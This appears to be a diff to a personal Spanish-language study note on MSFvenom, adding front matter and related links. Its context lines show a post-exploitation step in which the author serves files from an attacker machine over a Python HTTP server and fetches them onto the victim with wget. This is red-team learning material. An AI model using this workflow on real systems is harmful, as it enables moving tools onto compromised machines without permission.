@@ -1,3 +1,13 @@
+---
+title: MSFvenom
+area: ciberseguridad
+tipo: herramienta
+tags: [ciberseguridad, red-team, explotacion]
+created: 2026-01-18
+updated: 2026-09-20
+related: ["[[MOC-ciberseguridad]]", "[[red-team-killchain]]", "[[Nmap]]", "[[Metasploit]]", "[[Persistencia por ssh linux]]"]
+---
+
 Herramienta de Metasploit para:
 
 - Generar payloads
@@ -169,3 +179,11 @@ despues de eso accedemos al link desde la maquina victima que resulto del comand
 algo que me gusta hacer es que despues del ataque cuando ya tengo acceso a la maquina victima , creo un servidor http en python desde mi maquina atacante y desde la maquina victima pongo esto
 wget  <link_del_servido_http>  /  < nombre_del_archivo_que_queremos_descargar>   -o  (-o sirve para cambiar el nombre ) <nuevo_nombre>
 
+
+## Ver también
+
+- [[MOC-ciberseguridad]]
+- [[red-team-killchain]]
+- [[Nmap]]
+- [[Metasploit]]
+- [[Persistencia por ssh linux]]
